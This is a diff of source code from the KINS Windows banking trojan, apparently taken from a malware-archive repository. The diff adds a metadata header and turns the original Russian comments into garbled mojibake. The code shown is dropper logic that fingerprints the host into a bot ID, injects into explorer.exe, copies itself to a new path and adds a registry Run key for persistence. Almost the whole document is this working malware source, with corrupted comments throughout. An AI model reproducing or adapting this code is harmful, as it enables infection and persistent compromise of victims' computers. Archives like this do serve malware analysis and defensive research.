@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <intrin.h>
 #include <stdio.h>
 #include <windows.h>
@@ -170,11 +181,11 @@ PCHAR Drop::GetBotID()
 		CHAR cid[40];
 		DWORD subId[2];
 
-		//Получаем NetBIOS.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ NetBIOS.
 		int size = sizeof(cid) / sizeof(WCHAR);
 		if(GetComputerNameA(cid, (LPDWORD)&size) == FALSE) lstrcpynA(cid, "unknown", sizeof("unknown") / sizeof(CHAR));
 
-		//Получаем версию. Здесь мощная параноя по поводу Mem::_zero().
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Mem::_zero().
 		OSVERSIONINFOEXW ovi = {0};
 		
 		ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
@@ -184,13 +195,13 @@ PCHAR Drop::GetBotID()
 		{
 		CHAR regKey[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
 
-		//Дата установки.
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		{
 			CHAR regValue1[] = "InstallDate";
 			Utils::RegReadValue(HKEY_LOCAL_MACHINE, regKey, regValue1, REG_DWORD, &subId, sizeof(DWORD));
 		}
 
-		//Данные о регистрации.
+		//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		{
 			CHAR regValue2[] = "DigitalProductId";
 			void* Data;
@@ -203,7 +214,7 @@ PCHAR Drop::GetBotID()
 		}
 		}
 
-		//Создаем полный ID
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ ID
 		{
 		CHAR format[] = "%s_%08X%08X";
 		size = _snprintf(BotID, 60, format, cid, Utils::crc32Hash((LPBYTE)&ovi, sizeof(OSVERSIONINFOEXW)), Utils::crc32Hash((LPBYTE)subId, sizeof(subId)));
@@ -236,7 +247,7 @@ DWORD Drop::InjectStartThread(PVOID Context)
 
 	Config::ReadConfig();
 	char explorer_exe[] = "explorer.exe";
-	// Если мы эксплорер и это первый запуск наш в этой системе записываем себя в авторан и все дела
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (!lstrcmpi(CurrentProcess, explorer_exe) && Utils::CreateCheckMutex(DROP_EXP_MUTEX_ID, Drop::GetMachineGuid()))
 	{
 		Protect::StartProtect();
@@ -285,16 +296,16 @@ BOOL WINAPI Entry(HMODULE hDllHandle, DWORD reason, LPVOID lpReserved)
 	else if (Drop::IntegrityLevel != SECURITY_MANDATORY_LOW_RID)
 	{
 		DbgMsg(__FUNCTION__"(): Exe run: CurrentModulePath == '%S', Integrity == %u, CheckAdmin() == %u, IsWoW64() == %u, UAC enabled: %u\r\n", Drop::CurrentModulePath, Drop::IntegrityLevel, Drop::g_Admin, Utils::IsWow64(NtCurrentProcess()), Drop::g_UAC);
-		//Мы первые.
+		//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 		Drop::bFirstImageLoad = TRUE;
-		// Проверям основной мьютекс и мьютекс что бы два дроппера одновременно не запустились
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Utils::CheckMutex(DROP_EXP_MUTEX_ID, Drop::GetMachineGuid()) && (DropMutex = Utils::CreateCheckMutex(DROP_RUN_MUTEX_ID, Drop::GetMachineGuid())))
 		{
 			//bootkit::InstallBk(Drop::CurrentImageBase);
 			char cur_path[] = "CurrentPath";
 			Config::RegWriteString(cur_path, Drop::CurrentModulePath);
 
-			// Инжектимся через эксплоит в зависимости от ОС 32/64 если не получилось инжектимся обычным способом
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ 32/64 пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			//if (Utils::IsWow64(NtCurrentProcess())) bInject = Exploit64::InjectExplorer64(); else bInject = Exploit32::InjectExplorer32();
 			//if (!bInject) 
 			{
@@ -308,7 +319,7 @@ BOOL WINAPI Entry(HMODULE hDllHandle, DWORD reason, LPVOID lpReserved)
 				}
 			}
 
-			// Записываем в новую папку и добавляем в авторан в реестр
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			Protect::WriteFileToNewPath(Drop::CurrentModulePath, NewFileName);
 			Protect::AddKeyToRun(NewFileName);
 
@@ -320,7 +331,7 @@ BOOL WINAPI Entry(HMODULE hDllHandle, DWORD reason, LPVOID lpReserved)
 			bInject = TRUE;
 		}
 	}
-	// Если инжект не прошел или траблы с IntegrityLevel перезапускаем себя и отправляем логи на сервер
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ IntegrityLevel пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!bInject)
 	{
 		Utils::RestartModuleShellExec(Drop::CurrentModulePath);
